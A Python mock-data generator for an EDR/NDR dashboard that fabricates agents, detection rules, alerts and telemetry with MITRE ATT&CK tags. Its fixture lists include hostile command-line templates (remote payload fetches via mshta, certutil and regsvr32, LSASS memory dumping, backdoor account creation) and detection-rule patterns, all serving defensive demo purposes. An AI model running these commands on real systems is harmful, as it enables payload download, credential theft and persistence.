"""Realistic-looking mock data generators for the EDR/NDR portfolio dashboard.

Nothing here talks to a real EDR/NDR product. It fabricates a self-consistent
dataset: agents (endpoints), detection rules, alerts, and the raw telemetry
events that back an "incident investigation" view — including a cluster of
related events around each alert's timestamp so the ±2h context view has
something meaningful to show.
"""

import json
import random
import uuid
from datetime import datetime, timedelta, timezone

from faker import Faker

from app.models.enums import AgentStatus, AlertSource, AlertStatus, EventType, RuleType, Severity

fake = Faker()

# ---------------------------------------------------------------------------
# Reference data
# ---------------------------------------------------------------------------

GROUP_TAGS = ["Finance-DMZ", "HR-VPN", "Corp-WKS", "DMZ-Web", "DevOps-K8s", "Exec-Laptop", "Branch-Office"]

HOSTNAME_PREFIX = {
    "Finance-DMZ": "FIN-WKS",
    "HR-VPN": "HR-VPN",
    "Corp-WKS": "CORP-WKS",
    "DMZ-Web": "DMZ-WEB",
    "DevOps-K8s": "DEVOPS-K8S",
    "Exec-Laptop": "EXEC-LAP",
    "Branch-Office": "BR-WKS",
}

OS_CHOICES = [
    ("Windows", "11 Pro 23H2"),
    ("Windows", "11 Pro 23H2"),
    ("Windows", "10 Enterprise 22H2"),
    ("Windows", "10 Enterprise 22H2"),
    ("Windows Server", "2022 Standard"),
    ("Ubuntu", "22.04 LTS"),
    ("macOS", "14 Sonoma"),
]

ANALYSTS = ["bzkim", "j.park", "s.lee", "m.choi", None, None]  # None -> unassigned, weighted

# (process_name, parent_process, command_line_template, is_suspicious)
NORMAL_PROCESSES = [
    ("chrome.exe", "explorer.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"'),
    ("outlook.exe", "explorer.exe", '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"'),
    ("svchost.exe", "services.exe", "C:\\Windows\\System32\\svchost.exe -k netsvcs"),
    ("explorer.exe", "userinit.exe", "C:\\Windows\\explorer.exe"),
    ("teams.exe", "explorer.exe", '"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"'),
    ("code.exe", "explorer.exe", '"C:\\Users\\{user}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"'),
    ("slack.exe", "explorer.exe", '"C:\\Users\\{user}\\AppData\\Local\\slack\\slack.exe"'),
    ("winword.exe", "explorer.exe", '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"'),
]

SUSPICIOUS_PROCESSES = [
    ("powershell.exe", "winword.exe", "powershell.exe -nop -w hidden -enc {b64}"),
    ("cmd.exe", "powershell.exe", "cmd.exe /c whoami /all"),
    ("rundll32.exe", "explorer.exe", "rundll32.exe C:\\Users\\{user}\\AppData\\Local\\Temp\\update.dll,DllMain"),
    ("mshta.exe", "winword.exe", "mshta.exe http://{ip}/payload.hta"),
    ("wscript.exe", "outlook.exe", "wscript.exe C:\\Users\\{user}\\AppData\\Local\\Temp\\invoice.vbs"),
    ("certutil.exe", "cmd.exe", "certutil.exe -urlcache -split -f http://{ip}/a.exe C:\\Windows\\Temp\\a.exe"),
    ("regsvr32.exe", "cmd.exe", "regsvr32.exe /s /u /i:http://{ip}/x.sct scrobj.dll"),
    ("procdump.exe", "cmd.exe", "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"),
    ("net.exe", "cmd.exe", "net.exe user hacker P@ssw0rd123 /add"),
    ("schtasks.exe", "powershell.exe", "schtasks.exe /create /tn Updater /tr C:\\Windows\\Temp\\a.exe /sc onlogon"),
]

SUSPICIOUS_IPS = [
    "185.220.101.{}".format(n) for n in (4, 17, 33, 52, 61, 88)
] + ["45.155.205.{}".format(n) for n in (12, 44, 90)] + ["194.5.98.{}".format(n) for n in (10, 21)]

SUSPICIOUS_DOMAINS = [
    "a8f3e1c9.xyz", "update-service.top", "secure-login-ms.info", "cdn-assets-relay.ru",
    "pixel-track.icu", "office365-verify.click", "0x7f4d2.biz",
]

NORMAL_DOMAINS = [
    "google.com", "github.com", "office.com", "slack.com", "microsoft.com",
    "cloudflare.com", "zoom.us", "notion.so", "aws.amazon.com",
]

# Each template: title, severity, source, mitre id, description, kind (used to pick matching event content)
ALERT_TEMPLATES = [
    ("PowerShell 인코딩된 명령 실행 탐지", Severity.high, AlertSource.EDR, "T1059.001",
     "{host}에서 인코딩된 PowerShell 명령이 실행되었습니다. 부모 프로세스는 {parent}입니다.", "powershell"),
    ("의심스러운 LSASS 메모리 접근 (Credential Dumping)", Severity.critical, AlertSource.EDR, "T1003.001",
     "{host}에서 procdump 계열 도구가 lsass.exe 메모리에 접근을 시도했습니다.", "lsass"),
    ("Office 문서 매크로발 자식 프로세스 생성 의심", Severity.high, AlertSource.EDR, "T1204.002",
     "{host}에서 winword.exe가 스크립트 인터프리터를 자식 프로세스로 생성했습니다.", "office_spawn"),
    ("랜섬웨어 의심 - 대량 파일 확장자 변경", Severity.critical, AlertSource.EDR, "T1486",
     "{host}에서 짧은 시간 내 다수의 파일이 암호화된 확장자로 변경되었습니다.", "ransomware"),
    ("Windows Defender 실시간 보호 비활성화 시도", Severity.high, AlertSource.EDR, "T1562.001",
     "{host}에서 보안 제품 비활성화를 시도하는 명령이 실행되었습니다.", "defender_tamper"),
    ("레지스트리 Run 키 신규 자동실행 등록", Severity.medium, AlertSource.EDR, "T1547.001",
     "{host}의 사용자 Run 키에 새로운 자동 실행 항목이 추가되었습니다.", "persistence_run"),
    ("의심스러운 예약 작업 생성", Severity.medium, AlertSource.EDR, "T1053.005",
     "{host}에서 임시 폴더의 실행 파일을 대상으로 하는 예약 작업이 생성되었습니다.", "scheduled_task"),
    ("LOLBin 악용 의심 (certutil 다운로드)", Severity.medium, AlertSource.EDR, "T1105",
     "{host}에서 certutil.exe가 외부 URL로부터 파일을 다운로드했습니다.", "lolbin"),
    ("알려진 악성 해시 파일 실행 탐지", Severity.critical, AlertSource.EDR, "T1204",
     "{host}에서 위협 인텔리전스에 등록된 해시와 일치하는 파일이 실행되었습니다.", "known_hash"),
    ("비정상 자식 프로세스 체인 탐지", Severity.medium, AlertSource.EDR, "T1059",
     "{host}에서 explorer.exe → cmd.exe → powershell.exe 로 이어지는 비정상 프로세스 체인이 발견되었습니다.", "proc_chain"),
    ("업무 외 시간대 관리자 계정 로그온", Severity.medium, AlertSource.EDR, "T1078",
     "{host}에서 관리자 권한 계정이 비정상적인 시간대에 로그온했습니다.", "odd_hour_login"),
    ("다중 로그인 실패 후 성공 (Brute-force 의심)", Severity.high, AlertSource.EDR, "T1110",
     "{host}에서 짧은 시간 내 다수의 로그인 실패 후 성공 이벤트가 발생했습니다.", "bruteforce_login"),
    ("C2 추정 도메인에 대한 DNS 질의 탐지", Severity.critical, AlertSource.NDR, "T1071.004",
     "{host}에서 위협 인텔리전스상 C2로 알려진 도메인에 대한 DNS 질의가 발생했습니다.", "c2_dns"),
    ("비정상 아웃바운드 대용량 전송 탐지 (Exfiltration 의심)", Severity.high, AlertSource.NDR, "T1041",
     "{host}에서 평소 대비 비정상적으로 큰 아웃바운드 트래픽이 발생했습니다.", "exfil"),
    ("내부망 SMB 스캐닝 탐지 (Lateral Movement 의심)", Severity.high, AlertSource.NDR, "T1046",
     "{host}가 내부 대역에 대해 SMB(445) 포트 스캐닝으로 보이는 트래픽을 발생시켰습니다.", "smb_scan"),
    ("TOR 출구 노드 통신 탐지", Severity.medium, AlertSource.NDR, "T1090.003",
     "{host}에서 알려진 TOR 출구 노드로의 통신이 탐지되었습니다.", "tor"),
    ("비표준 포트 암호화 트래픽 탐지", Severity.medium, AlertSource.NDR, "T1571",
     "{host}에서 비표준 포트를 사용하는 암호화 트래픽이 탐지되었습니다.", "nonstd_port"),
    ("DNS 터널링 의심 트래픽 탐지", Severity.high, AlertSource.NDR, "T1071.004",
     "{host}에서 비정상적으로 빈번한 DNS TXT 질의 패턴이 탐지되었습니다.", "dns_tunnel"),
    ("봇넷 C2 IP 통신 탐지", Severity.critical, AlertSource.NDR, "T1071",
     "{host}가 알려진 봇넷 C2 IP와 통신했습니다.", "botnet_c2"),
    ("RDP 무차별 대입 공격 시도 탐지", Severity.high, AlertSource.NDR, "T1110.001",
     "{host}의 RDP(3389) 포트에 대한 무차별 대입 공격 시도가 탐지되었습니다.", "rdp_brute"),
    ("내부 자산발 대량 ICMP 트래픽", Severity.low, AlertSource.NDR, "T1046",
     "{host}에서 비정상적으로 많은 ICMP 요청이 발생했습니다.", "icmp_sweep"),
    ("신규 등록 도메인(NRD) 접속 탐지", Severity.medium, AlertSource.NDR, "T1583.001",
     "{host}에서 최근 등록된 도메인으로의 접속이 탐지되었습니다.", "nrd"),
]

RULE_DEFINITIONS = [
    (t[0], t[3], t[1], t[2], "signature" if "탐지" in t[0] or True else "signature")
    for t in ALERT_TEMPLATES
]


def _uid() -> str:
    return uuid.uuid4().hex


def _rand_dt(days_back: int, *, recent_bias: bool = True) -> datetime:
    now = datetime.now(timezone.utc)
    if recent_bias:
        # weight toward the last few days so the alert list feels "live"
        days = int(random.triangular(0, days_back, 0))
    else:
        days = random.uniform(0, days_back)
    return now - timedelta(days=days, seconds=random.randint(0, 86400))


def _internal_ip() -> str:
    return fake.ipv4_private()


def _sha256() -> str:
    return fake.sha256()


# ---------------------------------------------------------------------------
# Agents
# ---------------------------------------------------------------------------

def generate_agents(n: int) -> list[dict]:
    agents = []
    for i in range(n):
        group = random.choice(GROUP_TAGS)
        prefix = HOSTNAME_PREFIX[group]
        os_name, os_version = random.choice(OS_CHOICES)
        status = random.choices(
            [AgentStatus.online, AgentStatus.offline, AgentStatus.isolated],
            weights=[75, 20, 5],
        )[0]
        last_seen = datetime.now(timezone.utc) if status == AgentStatus.online else _rand_dt(7)
        agents.append(
            {
                "id": _uid(),
                "hostname": f"{prefix}-{1000 + i:04d}",
                "ip_address": _internal_ip(),
                "os": os_name,
                "os_version": os_version,
                "status": status,
                "agent_version": f"{random.randint(6, 8)}.{random.randint(0, 9)}.{random.randint(0, 20)}",
                "last_seen": last_seen,
                "group_tag": group,
                "risk_score": random.randint(0, 100),
                "created_at": _rand_dt(90, recent_bias=False),
            }
        )
    return agents


# ---------------------------------------------------------------------------
# Detection rules
# ---------------------------------------------------------------------------

def _rule_logic(kind: str) -> str:
    logics = {
        "T1059.001": "process_name == 'powershell.exe' AND command_line CONTAINS '-enc'",
        "T1003.001": "process_name IN ('procdump.exe','taskmgr.exe') AND command_line CONTAINS 'lsass'",
        "T1204.002": "parent_process == 'winword.exe' AND process_name IN ('powershell.exe','wscript.exe','mshta.exe')",
        "T1486": "event_type == 'file_write' AND file_path ENDSWITH ('.locked','.enc') COUNT > 20 WITHIN 60s",
        "T1562.001": "command_line CONTAINS 'Set-MpPreference' AND command_line CONTAINS 'DisableRealtimeMonitoring'",
        "T1547.001": "event_type == 'registry_modify' AND file_path CONTAINS 'CurrentVersion\\\\Run'",
        "T1053.005": "process_name == 'schtasks.exe' AND command_line CONTAINS '/create'",
        "T1105": "process_name == 'certutil.exe' AND command_line CONTAINS '-urlcache'",
        "T1204": "file_hash IN (threat_intel_known_bad_hashes)",
        "T1059": "process_chain MATCHES 'explorer.exe>cmd.exe>powershell.exe'",
        "T1078": "event_type == 'login' AND hour NOT BETWEEN 07:00-21:00 AND user IN (admin_group)",
        "T1110": "event_type == 'login' COUNT(failed) > 5 WITHIN 5m THEN COUNT(success) >= 1",
        "T1071.004": "event_type == 'dns_query' AND domain IN (ti_c2_domain_feed)",
        "T1041": "event_type == 'network_connection' AND bytes_out > p95_baseline(agent, 1h)",
        "T1046": "event_type == 'network_connection' AND dest_port == 445 AND DISTINCT(dest_ip) > 15 WITHIN 5m",
        "T1090.003": "dest_ip IN (ti_tor_exit_node_feed)",
        "T1571": "event_type == 'network_connection' AND dest_port NOT IN (443,80) AND tls == true",
        "T1583.001": "event_type == 'dns_query' AND domain_age_days(domain) < 30",
    }
    return logics.get(kind, "custom_condition == true")


def generate_rules(n: int) -> list[dict]:
    rules = []
    base = RULE_DEFINITIONS[:]
    random.shuffle(base)
    for i in range(n):
        name, mitre, severity, source, rule_type_hint = base[i % len(base)]
        rule_type = random.choices(
            [RuleType.signature, RuleType.threshold, RuleType.correlation], weights=[60, 25, 15]
        )[0]
        rules.append(
            {
                "id": _uid(),
                "name": f"[{source.value}] {name}",
                "description": f"{name}에 대한 자동 탐지 룰. 관련 MITRE ATT&CK 기법: {mitre}.",
                "rule_type": rule_type,
                "severity": severity,
                "logic": _rule_logic(mitre),
                "mitre_technique": mitre,
                "enabled": random.random() > 0.1,
                "hit_count": random.randint(0, 250),
                "created_by": random.choice([a for a in ANALYSTS if a]),
                "created_at": _rand_dt(90, recent_bias=False),
                "updated_at": _rand_dt(14),
            }
        )
    return rules


# ---------------------------------------------------------------------------
# Alerts
# ---------------------------------------------------------------------------

def generate_alerts(n: int, agents: list[dict], rules: list[dict], days_back: int) -> list[dict]:
    alerts = []
    rules_by_mitre: dict[str, list[dict]] = {}
    for r in rules:
        rules_by_mitre.setdefault(r["mitre_technique"], []).append(r)

    status_pool = (
        [AlertStatus.new] * 30
        + [AlertStatus.investigating] * 20
        + [AlertStatus.resolved] * 25
        + [AlertStatus.false_positive] * 15
        + [AlertStatus.closed] * 10
    )

    for _ in range(n):
        title, severity, source, mitre, desc_template, kind = random.choice(ALERT_TEMPLATES)
        agent = random.choice(agents) if (source == AlertSource.EDR or random.random() < 0.7) else None
        matching_rules = rules_by_mitre.get(mitre)
        rule = random.choice(matching_rules) if matching_rules else None

        created_at = _rand_dt(days_back)
        status = random.choice(status_pool)
        assignee = random.choice(ANALYSTS) if status != AlertStatus.new else None

        host = agent["hostname"] if agent else "unmanaged-host"
        parent = random.choice(SUSPICIOUS_PROCESSES)[1]

        if source == AlertSource.NDR:
            src_ip = agent["ip_address"] if agent else _internal_ip()
            dest_ip = random.choice(SUSPICIOUS_IPS) if kind not in ("icmp_sweep", "smb_scan") else _internal_ip()
        else:
            src_ip = agent["ip_address"] if agent else None
            dest_ip = random.choice(SUSPICIOUS_IPS) if random.random() < 0.3 else None

        alerts.append(
            {
                "id": _uid(),
                "title": title,
                "description": desc_template.format(host=host, parent=parent),
                "severity": severity,
                "status": status,
                "source": source,
                "agent_id": agent["id"] if agent else None,
                "src_ip": src_ip,
                "dest_ip": dest_ip,
                "mitre_technique": mitre,
                "detection_rule_id": rule["id"] if rule else None,
                "assignee": assignee,
                "created_at": created_at,
                "updated_at": created_at + timedelta(minutes=random.randint(0, 600)),
                "_kind": kind,  # used only to build matching events, not persisted
            }
        )
    return alerts


# ---------------------------------------------------------------------------
# Events
# ---------------------------------------------------------------------------

def _process_event(agent_id: str, ts: datetime, suspicious: bool, kind: str | None = None) -> dict:
    catalog = SUSPICIOUS_PROCESSES if suspicious else NORMAL_PROCESSES
    name, parent, cmd_template = random.choice(catalog)
    user = fake.user_name()
    ip = random.choice(SUSPICIOUS_IPS)
    cmd = cmd_template.format(user=user, ip=ip, b64=fake.lexify("?" * 40))
    return {
        "id": _uid(),
        "timestamp": ts,
        "agent_id": agent_id,
        "event_type": EventType.process_create,
        "process_name": name,
        "command_line": cmd,
        "parent_process": parent,
        "user": user,
        "src_ip": None,
        "dest_ip": None,
        "dest_port": None,
        "protocol": None,
        "file_hash": _sha256() if suspicious else None,
        "file_path": None,
        "raw": json.dumps({"pid": random.randint(1000, 60000), "integrity_level": "High" if suspicious else "Medium"}),
    }


def _network_event(agent_id: str, ts: datetime, agent_ip: str, suspicious: bool) -> dict:
    dest = random.choice(SUSPICIOUS_IPS) if suspicious else fake.ipv4_public()
    port = random.choice([4444, 8080, 443]) if suspicious else random.choice([443, 80, 53])
    return {
        "id": _uid(),
        "timestamp": ts,
        "agent_id": agent_id,
        "event_type": EventType.network_connection,
        "process_name": random.choice(SUSPICIOUS_PROCESSES)[0] if suspicious else "chrome.exe",
        "command_line": None,
        "parent_process": None,
        "user": fake.user_name(),
        "src_ip": agent_ip,
        "dest_ip": dest,
        "dest_port": port,
        "protocol": random.choice(["TCP", "UDP"]),
        "file_hash": None,
        "file_path": None,
        "raw": json.dumps({"bytes_out": random.randint(200, 5_000_000), "bytes_in": random.randint(200, 500_000)}),
    }


def _dns_event(agent_id: str, ts: datetime, suspicious: bool) -> dict:
    domain = random.choice(SUSPICIOUS_DOMAINS) if suspicious else random.choice(NORMAL_DOMAINS)
    return {
        "id": _uid(),
        "timestamp": ts,
        "agent_id": agent_id,
        "event_type": EventType.dns_query,
        "process_name": None,
        "command_line": None,
        "parent_process": None,
        "user": fake.user_name(),
        "src_ip": None,
        "dest_ip": None,
        "dest_port": 53,
        "protocol": "UDP",
        "file_hash": None,
        "file_path": None,
        "raw": json.dumps({"domain": domain, "query_type": "A", "resolved": not suspicious}),
    }


def _file_event(agent_id: str, ts: datetime, suspicious: bool) -> dict:
    user = fake.user_name()
    if suspicious:
        path = f"C:\\Users\\{user}\\Documents\\{fake.word()}.{random.choice(['docx', 'xlsx', 'pdf'])}.locked"
    else:
        path = f"C:\\Users\\{user}\\Documents\\{fake.word()}.{random.choice(['docx', 'xlsx', 'pdf', 'txt'])}"
    return {
        "id": _uid(),
        "timestamp": ts,
        "agent_id": agent_id,
        "event_type": EventType.file_write,
        "process_name": "svchost.exe" if not suspicious else random.choice(SUSPICIOUS_PROCESSES)[0],
        "command_line": None,
        "parent_process": None,
        "user": user,
        "src_ip": None,
        "dest_ip": None,
        "dest_port": None,
        "protocol": None,
        "file_hash": _sha256(),
        "file_path": path,
        "raw": json.dumps({"size_bytes": random.randint(1024, 5_000_000)}),
    }


def _registry_event(agent_id: str, ts: datetime, suspicious: bool) -> dict:
    key = (
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
        if suspicious
        else "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"
    )
    return {
        "id": _uid(),
        "timestamp": ts,
        "agent_id": agent_id,
        "event_type": EventType.registry_modify,
        "process_name": "reg.exe" if suspicious else "explorer.exe",
        "command_line": None,
        "parent_process": None,
        "user": fake.user_name(),
        "src_ip": None,
        "dest_ip": None,
        "dest_port": None,
        "protocol": None,
        "file_hash": None,
        "file_path": key,
        "raw": json.dumps({"value_name": "Updater" if suspicious else "HideFileExt", "value_data": "C:\\Windows\\Temp\\a.exe" if suspicious else "0"}),
    }


def _login_event(agent_id: str, ts: datetime, agent_ip: str, suspicious: bool) -> dict:
    success = not suspicious or random.random() < 0.2
    return {
        "id": _uid(),
        "timestamp": ts,
        "agent_id": agent_id,
        "event_type": EventType.login,
        "process_name": None,
        "command_line": None,
        "parent_process": None,
        "user": random.choice(["admin", "administrator", fake.user_name()]) if suspicious else fake.user_name(),
        "src_ip": agent_ip if not suspicious else fake.ipv4_public(),
        "dest_ip": agent_ip,
        "dest_port": None,
        "protocol": None,
        "file_hash": None,
        "file_path": None,
        "raw": json.dumps({"success": success, "logon_type": "RemoteInteractive" if suspicious else "Interactive"}),
    }


_KIND_TO_BUILDER = {
    "powershell": lambda a, ts, ip: [_process_event(a["id"], ts, True)],
    "lsass": lambda a, ts, ip: [_process_event(a["id"], ts, True)],
    "office_spawn": lambda a, ts, ip: [_process_event(a["id"], ts, True)],
    "ransomware": lambda a, ts, ip: [_file_event(a["id"], ts, True) for _ in range(3)],
    "defender_tamper": lambda a, ts, ip: [_process_event(a["id"], ts, True)],
    "persistence_run": lambda a, ts, ip: [_registry_event(a["id"], ts, True)],
    "scheduled_task": lambda a, ts, ip: [_process_event(a["id"], ts, True)],
    "lolbin": lambda a, ts, ip: [_process_event(a["id"], ts, True), _network_event(a["id"], ts, ip, True)],
    "known_hash": lambda a, ts, ip: [_process_event(a["id"], ts, True)],
    "proc_chain": lambda a, ts, ip: [_process_event(a["id"], ts, True), _process_event(a["id"], ts, True)],
    "odd_hour_login": lambda a, ts, ip: [_login_event(a["id"], ts, ip, True)],
    "bruteforce_login": lambda a, ts, ip: [_login_event(a["id"], ts, ip, True) for _ in range(4)],
    "c2_dns": lambda a, ts, ip: [_dns_event(a["id"], ts, True)],
    "exfil": lambda a, ts, ip: [_network_event(a["id"], ts, ip, True)],
    "smb_scan": lambda a, ts, ip: [_network_event(a["id"], ts, ip, False) for _ in range(5)],
    "tor": lambda a, ts, ip: [_network_event(a["id"], ts, ip, True)],
    "nonstd_port": lambda a, ts, ip: [_network_event(a["id"], ts, ip, True)],
    "dns_tunnel": lambda a, ts, ip: [_dns_event(a["id"], ts, True) for _ in range(6)],
    "botnet_c2": lambda a, ts, ip: [_network_event(a["id"], ts, ip, True)],
    "rdp_brute": lambda a, ts, ip: [_login_event(a["id"], ts, ip, True) for _ in range(5)],
    "icmp_sweep": lambda a, ts, ip: [_network_event(a["id"], ts, ip, False) for _ in range(4)],
    "nrd": lambda a, ts, ip: [_dns_event(a["id"], ts, True)],
}


def _noise_event(agent: dict, ts: datetime) -> dict:
    event_type = random.choices(
        list(EventType), weights=[35, 25, 10, 5, 15, 10]
    )[0]
    builder = {
        EventType.process_create: lambda: _process_event(agent["id"], ts, False),
        EventType.network_connection: lambda: _network_event(agent["id"], ts, agent["ip_address"], False),
        EventType.file_write: lambda: _file_event(agent["id"], ts, False),
        EventType.registry_modify: lambda: _registry_event(agent["id"], ts, False),
        EventType.dns_query: lambda: _dns_event(agent["id"], ts, False),
        EventType.login: lambda: _login_event(agent["id"], ts, agent["ip_address"], False),
    }[event_type]
    return builder()


def generate_events(total: int, agents: list[dict], alerts: list[dict], days_back: int) -> list[dict]:
    events: list[dict] = []
    agents_by_id = {a["id"]: a for a in agents}

    # 1) clustered events around every alert that has an attributed agent —
    #    this is what makes the "context window" investigation view meaningful.
    for alert in alerts:
        agent = agents_by_id.get(alert["agent_id"])
        if not agent:
            continue
        builder = _KIND_TO_BUILDER.get(alert["_kind"])
        if not builder:
            continue
        anchor_ts = alert["created_at"]
        matching = builder(agent, anchor_ts, agent["ip_address"])
        for ev in matching:
            ev["timestamp"] = anchor_ts + timedelta(seconds=random.randint(-120, 120))
            events.append(ev)
        # surrounding "noise" within +/- 30 minutes on the same host
        for _ in range(random.randint(4, 10)):
            offset = timedelta(minutes=random.uniform(-30, 30))
            events.append(_noise_event(agent, anchor_ts + offset))

    # 2) background noise across the full time range to fill out the dataset
    remaining = max(total - len(events), 0)
    for _ in range(remaining):
        agent = random.choice(agents)
        ts = _rand_dt(days_back)
        events.append(_noise_event(agent, ts))

    return events
